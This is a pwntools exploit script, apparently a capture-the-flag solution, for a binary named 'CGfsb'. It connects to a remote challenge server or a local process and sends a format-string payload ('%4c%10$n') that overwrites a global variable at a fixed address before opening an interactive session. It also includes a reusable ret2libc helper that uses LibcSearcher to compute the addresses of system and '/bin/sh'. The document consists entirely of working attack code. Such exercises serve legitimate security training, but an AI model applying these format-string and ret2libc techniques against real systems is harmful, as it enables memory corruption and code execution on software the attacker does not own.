from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func):
	#libc = ELF('./libc-2.23.so')
    libc = LibcSearcher(func, leak)

    base = leak - libc.dump(func)
    system = base + libc.dump('system')
    binsh = base + libc.dump('str_bin_sh')
    return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(arch='amd64', os='linux', log_level = 'DEBUG')
binary = './CGfsb'
elf = ELF(binary)
#libc = ELF('./libc_32.so.6')
p = remote('111.198.29.45',52147) if argv[1]=='r' else process(binary)

# start
pwnme = 0x804a068
sla('name:\n', 'merc')
sla('please:\n', p32(pwnme) + '%4c%10$n')
# end

itr()
